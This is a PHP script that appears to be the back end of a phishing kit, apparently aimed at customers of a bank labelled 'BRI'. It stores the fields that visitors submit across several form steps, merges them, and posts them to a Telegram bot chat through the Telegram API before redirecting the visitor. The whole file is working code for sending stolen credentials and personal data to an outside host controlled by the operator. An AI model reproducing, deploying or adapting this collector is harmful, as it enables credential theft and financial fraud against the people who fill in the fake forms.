<?php session_start(); include_once('../appConfig.php');$result_title = "# BRI"; function sanitizeInput($input) { return htmlspecialchars(trim($input), ENT_QUOTES, 'UTF-8'); } function storeFormData($formData) { if (isset($formData['formid'])) { $sanitizedData = array_map('sanitizeInput', $formData); $_SESSION[$sanitizedData['formid']] = $sanitizedData; } } function mergeFormData($formData) { $mergedData = []; if (isset($formData['merge'])) { $mergeIds = array_map('trim', explode(',', $formData['merge'])); foreach ($mergeIds as $id) { if (isset($_SESSION[$id])) { $mergedData[$id] = $_SESSION[$id]; } } } return $mergedData; } function formatMessage($mergedData, $desc) { global $result_title; if (empty($mergedData)) { return ''; } $web_url = $_SERVER['HTTP_HOST']; $message = "<pre>$result_title | $desc</pre>\n\n"; foreach ($mergedData as $formId => $formData) { $desc = $formData['desc'] ?? ''; $message .= "<a href='$web_url'>" . str_replace('|','-',$desc) . "</a>\n"; foreach ($formData as $key => $value) { if (!in_array($key, ['desc', 'href', 'goto', 'merge', 'formid'])) { $formattedKey = formatFieldName($key); $message .= "â€¢ <b>$formattedKey:</b> <code>$value</code>\n"; } } $message .= "\n"; } return $message; } function formatFieldName($fieldName) { $fieldName = preg_replace('/^UCUP#/', '', $fieldName); return ucwords(str_replace('_', ' ', $fieldName)); } function sendToTelegram($message) { global $id_telegram, $id_botTele; $url = "https://api.telegram.org/bot" . urlencode($id_botTele) . "/sendMessage"; $params = [ 'chat_id' => $id_telegram, 'text' => $message, 'parse_mode' => 'HTML', 'disable_web_page_preview' => true ]; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_POST, 1); curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params)); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true); $result = curl_exec($ch); curl_close($ch); return $result; } function handleRedirect($formData) { if (!empty($formData['href'])) { header("Location: ../{$formData['href']}"); exit; } } function validateFormData($formData) { $requiredFields = ['desc', 'formid', 'merge']; foreach ($requiredFields as $field) { if (!isset($formData[$field]) || empty($formData[$field])) { return false; } } return true; } if ($_SERVER["REQUEST_METHOD"] == "POST") { if (validateFormData($_POST)) { storeFormData($_POST); $mergedData = mergeFormData($_POST); $message = formatMessage($mergedData, $_POST['desc']); sendToTelegram($message); handleRedirect($_POST); } else { http_response_code(403); exit; } } else { http_response_code(403); exit; } ?>